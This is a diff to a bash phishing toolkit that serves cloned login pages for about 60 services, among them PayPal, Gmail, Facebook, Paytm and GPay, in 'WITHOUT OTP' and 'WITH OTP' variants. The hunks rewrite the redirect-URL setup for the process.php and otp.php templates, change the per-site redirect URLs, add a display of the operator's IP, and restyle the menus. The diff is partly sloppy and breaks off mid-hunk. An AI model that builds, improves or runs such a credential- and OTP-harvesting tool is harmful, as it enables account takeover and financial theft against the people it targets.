@@ -594,25 +594,23 @@ redirect_check(){
 	        esac
 }
 redirect_input() {
+        echo"\n"
         read -p "${RED}[${WHITE}?${RED}]${YELLOW} Your Redirect URL : ${BLUE}" urdurl
-        if [[ ! "${urdurl//:*}" =~ ^([h][t][t][p]|[h][t][t][p][s])$ ]]; then
-		if [[  "${urdurl::3}" != 'www' ]]; then
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error : Invalid URL | USE www/http/https insted of : ${ururl}"
-			{ sleep 1.5; clear; banner; redirect_input; }
-		fi
+        if [[ "${urdurl//:*}" =~ ^([h][t][t][p]|[h][t][t][p][s])$ ]]; then
+		echo "${RED}[${WHITE}!${RED}]${RED} Don't type http or https in the URL"
+                sleep 3
+                clear
+                banner
+                redirect_input
         else
                 redirect_setup
 	fi
 }
 redirect_setup() {
 	if [ -f ${www_dir}/NOTP ];then
-                sed -i "" "s/redirecturl/${urdurl}/g" "${www_dir}/process.php" > process.php
-                rm -rf ${www_dir}/process.php
-                mv process.php ${www_dir}
+                sed -i "s/redirecturl/${urdurl}/g" "${www_dir}/process.php"
         elif [[ -f ${www_dir}/OOTP || -f ${www_dir}/POTP ]];then
-                sed -i "" "s/redirecturl/${urdurl}/g" "${www_dir}/otp.php" > otp.php
-                rm -rf ${www_dir}/otp.php
-                mv otp.php ${www_dir}
+                sed -i "s/redirecturl/${urdurl}/g" "${www_dir}/otp.php"
 	else
 		echo "${RED}[${WHITE}!${RED}]${RED} Error Occured in setting up custom redirect URL!!"
                 echo -ne "\n${RED}[${WHITE}?${RED}]${GREEN} Setting up default redirect URL"
@@ -623,13 +621,11 @@ redirect_setup() {
 }
 redirect_default() {
 	if [ -f ${www_dir}/NOTP ];then
-                sed -i "" "s/redirecturl/${rdurl}/g" "${www_dir}/process.php" > process.php
-                rm -rf ${www_dir}/process.php
-                mv process.php ${www_dir}/
+                sed -i "s/redirecturl/${rdurl}/g" "${www_dir}/process.php"
         elif [[ -f ${www_dir}/OOTP || -f ${www_dir}/POTP ]];then
                 sed -i "s/redirecturl/${rdurl}/" "${www_dir}/otp.php"
 	else
-		echo " ${RED}[${WHITE}!${RED}]${RED} Error Occured in setting up custom redirect URL!!"
+		echo " ${RED}[${WHITE}!${RED}]${RED} Error Occured in setting up redirect URL!!"
         fi
 }
 
@@ -995,13 +991,20 @@ capture_otp() {
 }
 
 #online or offline stats
-netstats="Offline"
 check_netstats() {
 	wget -q --spider http://api.github.com
 	if [ $? -eq 0 ]; then
 		netstats="${GREEN}Online"
 	else
 		netstats="${RED}Offline"
+	fi
+}
+userip() {
+        myip=$(curl ipinfo.io/ip)
+	if [ $myip!=127.0.0.1 ]; then
+		myip="${GREEN}$myip"
+	else
+		mpip="${RED}Your Offline"
 	fi
 }
 #Logs check
@@ -1088,8 +1091,10 @@ echo -e " "
 banner
 echo -e " "
 echo -e " "
+userip
 check_netstats
-echo "${GREEN}Network Status = $netstats"
+echo "${BLUE}Your IP address = $myip"
+echo "${BLUE}Network Status  = $netstats"
 echo -e " "
 echo -e "${RED} CHOOSE A SITE : ${NC}"
 echo -e " "
@@ -1103,7 +1108,7 @@ echo -e "${BLUE} [7] ${GREEN} Badoo 	    ${NC}""${BLUE} [32] ${GREEN} Ola       
 echo -e "${BLUE} [8] ${GREEN} Clash of Clans${NC}""${BLUE} [33] ${GREEN} Origin        ${NC}""${BLUE} [58] ${GREEN} VK              ${NC}"
 echo -e "${BLUE} [9] ${GREEN} Date 	    ${NC}""${BLUE} [34] ${GREEN} Paypal        ${NC}""${BLUE} [59] ${GREEN} Whatsapp        ${NC}"
 echo -e "${BLUE} [10] ${GREEN} Devianart    ${NC}""${BLUE} [35] ${GREEN} Paytm         ${NC}""${BLUE} [60] ${GREEN} Wordpress       ${NC}"
-echo -e "${BLUE} [11] ${GREEN} DropBox 	    ${NC}""${BLUE} [36] ${GREEN} Phonepe      ${NC}""${BLUE} [61] ${GREEN} Xbox            ${NC}"
+echo -e "${BLUE} [11] ${GREEN} DropBox 	    ${NC}""${BLUE} [36] ${GREEN} Phonepe       ${NC}""${BLUE} [61] ${GREEN} Xbox            ${NC}"
 echo -e "${BLUE} [12] ${GREEN} Ebay         ${NC}""${BLUE} [37] ${GREEN} Pinterest     ${NC}""${BLUE} [62] ${GREEN} Yahoo           ${NC}"
 echo -e "${BLUE} [13] ${GREEN} Facebook     ${NC}""${BLUE} [38] ${GREEN} Playstation   ${NC}""${BLUE} [63] ${GREEN} Yandex          ${NC}"
 echo -e "${BLUE} [14] ${GREEN} Flipcart     ${NC}""${BLUE} [39] ${GREEN} ProtonMail    ${NC}""${BLUE} [64] ${GREEN} Youtube Subs    ${NC}"
@@ -1119,8 +1124,8 @@ echo -e "${BLUE} [23] ${GREEN} Jazz	    ${NC}""${BLUE} [48] ${GREEN} Steam      
 echo -e "${BLUE} [24] ${GREEN} Jio 	    ${NC}""${BLUE} [49] ${GREEN} Subitout      ${NC}"
 echo -e "${BLUE} [25] ${GREEN} Linkedin     ${NC}""${BLUE} [50] ${GREEN} Telegram      ${NC}"
 echo -e " "
-echo -e "${BLUE} [A] ${RED} About         ${NC}""${BLUE} [B] ${RED} Request A site ${NC}""${BLUE} [C] ${RED} Report Issue${NC}"
-echo -e "${BLUE} [D] ${RED} View Logs     ${NC}""${BLUE} [E] ${RED} Check Updates  ${NC}""${BLUE} [00] ${RED} Exit       ${NC}"
+echo -e "${BLUE} [A] ${MAGENTA} About         ${NC}""${BLUE} [B] ${MAGENTA} Request A site ${NC}""${BLUE} [C] ${MAGENTA} Report Issue${NC}"
+echo -e "${BLUE} [D] ${MAGENTA} View Logs     ${NC}""${BLUE} [E] ${MAGENTA} Check Updates  ${NC}""${BLUE} [00] ${MAGENTA} Exit       ${NC}"
 echo -e " "
 read -p "${RED}[${WHITE}?${RED}]${YELLOW} Select an option : ${BLUE}" reply
 echo " "
@@ -1277,15 +1282,18 @@ case $reply in
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                  { sleep 1; clear; mainmenu; };;
 esac
-clear
-banner
 }
 
 #WEBSITES
 #adobe
 site_adobe(){
 siname="Adobe"
-rdurl="https://https://www.adobe.com"
+rdurl="www.adobe.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1306,14 +1314,19 @@ esac
 #airtelsim
 site_airtelsim(){
 website="airtelsim"
-rdurl="https://www.airtel.in"
+rdurl="www.airtel.in"
 siname="Airtel Sim"
 tunnelmenu
 }
 #airtelxstream
 site_airtelxstream(){
 siname="AirtelXStream"
-rdurl="https://www.airtelxstream.in/"
+rdurl="www.airtelxstream.in"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1334,7 +1347,12 @@ esac
 #ajio
 site_ajio(){
 siname="AJIO"
-rdurl="https://www.ajio.com/"
+rdurl="www.ajio.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1355,7 +1373,12 @@ esac
 #amazon
 site_amazon(){
 siname="Amazon"
-rdurl="https://www.amazon.com/"
+rdurl="www.amazon.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1376,7 +1399,12 @@ esac
 #apple
 site_apple(){
 siname="Apple"
-rdurl="https://www.apple.com"
+rdurl="www.apple.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1397,7 +1425,12 @@ esac
 #badoo
 site_badoo(){
 siname="Badoo"
-rdurl="https://badoo.com/"
+rdurl="badoo.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1418,14 +1451,19 @@ esac
 #clashofclans
 site_clashofclans(){
 website="clashofclans"
-rdurl="https://clashofclans.com/"
+rdurl="clashofclans.com/"
 siname="Clash Of Clans"
 tunnelmenu
 }
 #date
 site_date(){
 siname="Date (Multiple phish)"
-rdurl="https://date.com/"
+rdurl="date.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} Template 1 - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Template 1 - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Template 2 - WITHOUT OTP ${NC}"
@@ -1454,7 +1492,12 @@ esac
 #devianart
 site_devianart(){
 siname="Devian Art"
-rdurl="https://www.deviantart.com/"
+rdurl="www.deviantart.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1475,14 +1518,19 @@ esac
 #dropbox
 site_dropbox(){
 website="dropbox"
-rdurl="https://www.dropbox.com/"
+rdurl="www.dropbox.com/"
 siname="Drop Box"
 tunnelmenu
 }
 #ebay
 site_ebay(){
 siname="Ebay"
-rdurl="https://www.ebay.com/"
+rdurl="www.ebay.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 -echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1503,7 +1551,12 @@ esac
 #facebook
 site_facebook(){
 siname="Facebook"
-rdurl="https://www.facebook.com"
+rdurl="www.facebook.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} Facebook - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Facebook - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Facebook Poll - WITHOUT OTP ${NC}"
@@ -1544,7 +1597,12 @@ esac
 #flipcart
 site_flipcart(){
 siname="Flipcart"
-rdurl="https://www.flipcart.com"
+rdurl="www.flipcart.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1565,14 +1623,19 @@ esac
 #freefire
 site_freefire(){
 website="freefire"
-rdurl="https://ff.garena.com"
+rdurl="ff.garena.com"
 siname="Free Fire"
 tunnelmenu
 }
 #github
 site_github(){
 siname="GitHub"
-rdurl="https://www.github.com"
+rdurl="www.github.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} Default - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
@@ -1601,7 +1664,12 @@ esac
 #gitlab
 site_gitlab(){
 siname="GitLab"
-rdurl="https://www.gitlab.com"
+rdurl="www.gitlab.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} Default - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
@@ -1630,7 +1698,12 @@ esac
 #gmail
 site_gmail(){
 siname="Gmail"
-rdurl="https://www.gmail.com"
+rdurl="www.gmail.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1651,7 +1724,12 @@ esac
 #google
 site_google(){
 siname="Google"
-rdurl="https://www.gmail.com"
+rdurl="www.gmail.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} Google - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Google - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Google Poll - WITHOUT OTP ${NC}"
@@ -1688,7 +1766,12 @@ esac
 #gpay
 site_gpay(){
 siname="Gpay"
-rdurl="https://pay.google.com"
+rdurl="pay.google.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1709,14 +1792,19 @@ esac
 #icloud
 site_icloud(){
 website="icloud"
-rdurl="https://www.icloud.com/"
+rdurl="www.icloud.com/"
 siname="iCloud"
 tunnelmenu
 }
 #instagram
 site_instagram(){
 siname="Instagram"
-rdurl="https://www.instagram.com"
+rdurl="www.instagram.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} Instagram - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Instagram - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Instagram Advanced - WITHOUT OTP ${NC}"
@@ -1777,14 +1865,19 @@ esac
 #jazz
 site_jazz(){
 website="jazz"
-rdurl="https://jazz.com.pk/"
+rdurl="jazz.com.pk/"
 siname="Jazz"
 tunnelmenu
 }
 #jio
 site_jio(){
 siname="JIO"
-rdurl="https://www.jio.com/"
+rdurl="www.jio.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} Jio sim ${NC}"
 echo -e "${BLUE}[02]${CYAN} Jio offer ${NC}"
 echo -e " ${NC}"
@@ -1805,7 +1898,12 @@ esac
 #linkedin
 site_linkedin(){
 siname="Linkedin"
-rdurl="https://linkedin.com/"
+rdurl="linkedin.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1826,7 +1924,12 @@ esac
 #mediafire
 site_mediafire(){
 siname="Medifire"
-rdurl="https://www.mediafire.com/"
+rdurl="www.mediafire.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1847,7 +1950,12 @@ esac
 #messenger
 site_messenger(){
 siname="Messenger"
-rdurl="https://www.messenger.com/"
+rdurl="www.messenger.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} Messenger - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Messenger - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Messenger old - WITHOUT OTP ${NC}"
@@ -1876,7 +1984,12 @@ esac
 #microsoft
 site_microsoft(){
 siname="Microsoft"
-rdurl="https://www.microsoft.com"
+rdurl="www.microsoft.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1897,14 +2010,19 @@ esac
 #mobiwik
 site_mobiwik(){
 website="mobiwik"
-rdurl="https://www.mobikwik.com/"
+rdurl="www.mobikwik.com/"
 siname="Mobiwik"
 tunnelmenu
 }
 #myspace
 site_myspace(){
 siname="MySpace"
-rdurl="https://myspace.com"
+rdurl="myspace.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1925,7 +2043,12 @@ esac
 #netflix
 site_netflix(){
 siname="Netflix"
-rdurl="https://www.netflix.com"
+rdurl="www.netflix.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1946,21 +2069,26 @@ esac
 #ola
 site_ola(){
 website="ola"
-rdurl="https://www.olacabs.com/"
+rdurl="www.olacabs.com/"
 siname="OLA"
 tunnelmenu
 }
 #origin
 site_origin(){
 website="origin"
-rdurl="https://origin.onl/"
+rdurl="origin.onl/"
 siname="origin"
 tunnelmenu
 }
 #paypal
 site_paypal(){
 siname="Paypal"
-rdurl="https://www.paypal.com"
+rdurl="www.paypal.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1981,7 +2109,12 @@ esac
 #paytm
 site_paytm(){
 siname="Paytm"
-rdurl="https://paytm.com/"
+rdurl="paytm.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} Paytm - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Paytm - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Paytm offer - WITHOUT OTP ${NC}"
@@ -2010,21 +2143,26 @@ esac
 #phonepe
 site_phonepe(){
 website="phonepe"
-rdurl="https://www.phonepe.com/"
+rdurl="www.phonepe.com/"
 siname="phonepe"
 tunnelmenu
 }
 #origin
 site_pinterest(){
 website="pinterest"
-rdurl="https://pinterest.com/"
+rdurl="pinterest.com/"
 siname="Pinterest"
 tunnelmenu
 }
 #playstation
 site_playstation(){
 siname="PlayStation"
-rdurl="https://www.playstation.com"
+rdurl="www.playstation.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} Playstation 1 - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Playstation 1 - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Playstation 2 - WITHOUT OTP ${NC}"
@@ -2049,7 +2187,7 @@ esac
 #protonmail
 site_protonmail(){
 siname="Proton Mail"
-rdurl="https://proton.me/"
+rdurl="proton.me/"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2070,21 +2208,26 @@ esac
 #pubg
 site_pubg(){
 website="pubg"
-rdurl="https://www.pubgmobile.com/"
+rdurl="www.pubgmobile.com/"
 siname="PUBG"
 tunnelmenu
 }
 #quora
 site_quora(){
 website="quora"
-rdurl="https://www.quora.com/"
+rdurl="www.quora.com/"
 siname="Quora"
 tunnelmenu
 }
 #reddit
 site_reddit(){
 siname="Reddit"
-rdurl="https://www.reddit.com/"
+rdurl="www.reddit.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} Reddit ${NC}"
 echo -e "${BLUE}[02]${CYAN} Reddit old ${NC}"
 echo -e " ${NC}"
@@ -2105,7 +2248,12 @@ esac
 #shopify
 site_shopify(){
 siname="Shopify"
-rdurl="https://www.shopify.com"
+rdurl="www.shopify.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2126,7 +2274,12 @@ esac
 #snapchat
 site_snapchat(){
 siname="Snapchat"
-rdurl="https://www.snapchat.com/"
+rdurl="www.snapchat.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2147,7 +2300,12 @@ esac
 #socialclub
 site_socialclub(){
 siname="SocialClub"
-rdurl="https://socialclub.rockstargames.com/"
+rdurl="socialclub.rockstargames.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2168,7 +2326,12 @@ esac
 #spotify
 site_spotify(){
 siname="Spotify"
-rdurl="https://www.spotify.com"
+rdurl="www.spotify.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2189,7 +2352,12 @@ esac
 #stackoverflow
 site_stackoverflow(){
 siname="Stackoverflow"
-rdurl="https://stackoverflow.com/"
+rdurl="stackoverflow.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2210,7 +2378,12 @@ esac
 #steam
 site_steam(){
 siname="Steam"
-rdurl="https://store.steampowered.com/"
+rdurl="store.steampowered.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2231,28 +2404,33 @@ esac
 #subitoit
 site_subitoit(){
 website="subitoit"
-rdurl="https://www.subito.it/"
+rdurl="www.subito.it/"
 siname="Subitoit"
 tunnelmenu
 }
 #telegram
 site_telegram(){
 website="telegram"
-rdurl="https://telegram.org/"
+rdurl="telegram.org/"
 siname="Telegram"
 tunnelmenu
 }
 #telenor
 site_telenor(){
 website="telenor"
-rdurl="https://www.telenor.com/"
+rdurl="www.telenor.com/"
 siname="Trgin"
 tunnelmenu
 }
 #tiktok
 site_tiktok(){
 siname="TikTok"
-rdurl="https://www.tiktok.com"
+rdurl="www.tiktok.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} Tiktok - WITH OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
@@ -2277,7 +2455,7 @@ esac
 #twitch
 site_twitch(){
 siname="Twitch"
-rdurl="https://www.twitch.tv/"
